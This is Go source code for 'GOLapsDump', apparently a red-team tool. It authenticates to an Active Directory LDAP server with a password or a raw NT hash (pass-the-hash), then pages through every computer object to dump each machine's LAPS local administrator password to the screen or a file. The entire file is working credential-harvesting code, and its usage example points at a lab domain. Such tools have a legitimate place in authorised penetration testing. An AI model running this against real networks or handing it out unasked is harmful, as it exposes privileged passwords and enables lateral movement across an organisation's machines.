package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"github.com/go-ldap/ldap/v3"
)

// baseCreator generates the LDAP search base from the domain.
func baseCreator(domain string) string {
	var searchBase string
	base := strings.Split(domain, ".")
	for _, b := range base {
		searchBase += "DC=" + b + ","
	}
	return searchBase[:len(searchBase)-1]
}

func main() {
	// Define command-line flags
	username := flag.String("u", "", "username for LDAP")
	password := flag.String("p", "", "password for LDAP")
	ntHash := flag.String("H", "", "NT hash for LDAP authentication")
	ldapServer := flag.String("l", "", "LDAP server")
	domain := flag.String("d", "", "Domain")
	port := flag.Int("port", 389, "LDAP server port (default is 389)")
	outputFile := flag.String("o", "", "Output file path")

	// Customize Usage function
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "\nUsage: GOLapsDump.exe -u jorah.mormont -p Pa$$w0rd -d essos.local -l 192.168.56.12\n\n")
		fmt.Fprintf(os.Stderr, "  -u \tusername for LDAP\n")
		fmt.Fprintf(os.Stderr, "  -p \tpassword for LDAP\n")
		fmt.Fprintf(os.Stderr, "  -H \tntHash\n")
		fmt.Fprintf(os.Stderr, "  -l \tLDAP server (or domain)\n")
		fmt.Fprintf(os.Stderr, "  -d \tDomain\n")
		fmt.Fprintf(os.Stderr, "  -port\tLDAP server port (default is 389)\n")
		fmt.Fprintf(os.Stderr, "  -o \tOutput file path\n")
	}

	// Parse command-line flags
	flag.Parse()

	// Check if required flags are provided
	if *username == "" || *domain == "" || (*password == "" && *ntHash == "") {
		flag.Usage() // Use the customized Usage function
		return
	}

	// Concatenate the username and domain to form the full LDAP username
	fullUsername := fmt.Sprintf("%s@%s", *username, *domain)

	// Print initialization message
	fmt.Println("---------------------------------------------------------")
	fmt.Printf("Initializing GOLapsDump at %s on %s\n", time.Now().Format("15:04:05"), time.Now().Format("2006-01-02"))
	fmt.Println("by \x1b[33mk4ls3c\x1b[0m at \x1b[31mCyderes\x1b[0m")
	fmt.Println("---------------------------------------------------------\x1b[33m")

	var server string
	if *ldapServer != "" {
		server = *ldapServer
	} else {
		server = *domain
	}

	// Connect to LDAP server
	conn, err := ldap.Dial("tcp", fmt.Sprintf("%s:%d", server, *port))
	if err != nil {
		fmt.Println("Error connecting to LDAP:", err)
		return
	}
	defer conn.Close()

	// Bind to LDAP server
	if *password != "" {
		// Use password-based authentication
		err = conn.Bind(fullUsername, *password)
	} else {
		// Use NT hash-based authentication
		err = conn.NTLMBindWithHash(*domain, *username, *ntHash)
	}

	if err != nil {
		log.Fatalf("Authentication failed: %v", err)
	}

	// Generate LDAP search base from the domain
	searchBase := baseCreator(*domain)

	// Create LDAP search request with PageSize set to a reasonable value
	pageSize := uint32(100) // You can adjust this based on your needs
	searchRequest := ldap.NewSearchRequest(
		searchBase,
		ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false,
		fmt.Sprintf("(&(objectCategory=computer)(ms-MCS-AdmPwd=*))"),
		[]string{"ms-MCS-AdmPwd", "sAMAccountname"},
		nil,
	)
	searchRequest.Controls = append(searchRequest.Controls, ldap.NewControlPaging(pageSize))

	// Prepare output file
	var outputWriter *os.File
	if *outputFile != "" {
		outputWriter, err = os.Create(*outputFile)
		if err != nil {
			fmt.Println("Error creating output file:", err)
			return
		}
		defer outputWriter.Close()
	} else {
		outputWriter = os.Stdout
	}

	// Perform LDAP search with paging
	for {
		sr, err := conn.Search(searchRequest)
		if err != nil {
			fmt.Println("Error searching LDAP:", err)
			return
		}

		// Print search results to file or standard output
		for _, entry := range sr.Entries {
			outputWriter.WriteString(fmt.Sprintf("%s:%s\n", entry.GetAttributeValue("sAMAccountName"), entry.GetAttributeValue("ms-Mcs-AdmPwd")))
		}

		// Check for the presence of a paging control in the response
		control := ldap.FindControl(sr.Controls, ldap.ControlTypePaging)
		if control == nil {
			break // No more pages
		}

		cookie := control.(*ldap.ControlPaging).Cookie
		if len(cookie) == 0 {
			break // Empty cookie, indicating the last page
		}

		// Update the search request with the new cookie for the next page
		searchRequest.Controls[0].(*ldap.ControlPaging).SetCookie(cookie)
	}
	fmt.Println("\x1b[0m---------------------------------------------------------")
	fmt.Printf("Task complete GOLapsDump at %s on %s\n", time.Now().Format("15:04:05"), time.Now().Format("2006-01-02"))
	fmt.Println("---------------------------------------------------------")
}
